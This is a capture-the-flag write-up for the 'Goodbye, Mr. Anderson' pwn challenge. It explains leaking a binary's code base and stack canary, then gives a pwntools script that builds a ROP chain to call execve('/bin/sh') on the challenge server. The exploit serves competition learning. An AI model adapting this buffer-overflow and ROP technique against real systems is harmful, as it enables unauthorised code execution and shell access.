### Goodbye, Mr. Anderson (300 Points)

> Do it again Neo. Cheat death.
>
> [attachment](leaks-c85e4a348b2a07ba8e6484d69956d968)

This program has four input and three output:

- The first input is stored in .bss, so we can input the "/bin/sh" . 
- Than use the second input and output to leak the .text address. 
  - if we have .text segment address, we can get address of "bin/sh" and get address of gadgets in the .text segment. such as `pop rdi; ret`,`pop rax;syscall` 
- The third input and output are used to leak the canary value.
- Now, we can use the last input lay out the stack to ROP (call execve syscall).

#### exploit script

```python
from pwn import *
context.log_level='debug'

#p = process('leaks-c85e4a348b2a07ba8e6484d69956d968')

p = remote('chal.ctf.b01lers.com',1009)
elf = ELF('./leaks-c85e4a348b2a07ba8e6484d69956d968')
libc = elf.libc

# gdb.attach(p)
p.recvuntil('Mr. Anderson.\n')

p.sendline('8')
p.sendline('/bin/sh\x00')


p.sendline('8')
p.sendline('C'*8)

p.recvuntil('C'*8)
code_base = u64(p.recv(6).ljust(8,'\x00'))-0x110a
print hex(code_base)


p.sendline('24')
p.sendline('A'*24)
#gdb.attach(p,'b printf')
p.recvuntil('A'*24)
canary = u64(p.recv(8))-0xa
print hex(canary)


pop_rdi = code_base+0x00000000000013f3
pop_rsi_15 = code_base + 0x00000000000013f1

payload = 'A'*0x18
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(code_base+elf.sym['name'])
payload += p64(pop_rsi_15)
payload += p64(0)
payload += p64(0)
payload += p64(code_base+elf.sym['yay']+8) # pop rax;syscall
payload += p64(0x3b)

p.sendline(str(len(payload)))
# gdb.attach(p)
p.sendline(payload)


p.interactive()
```

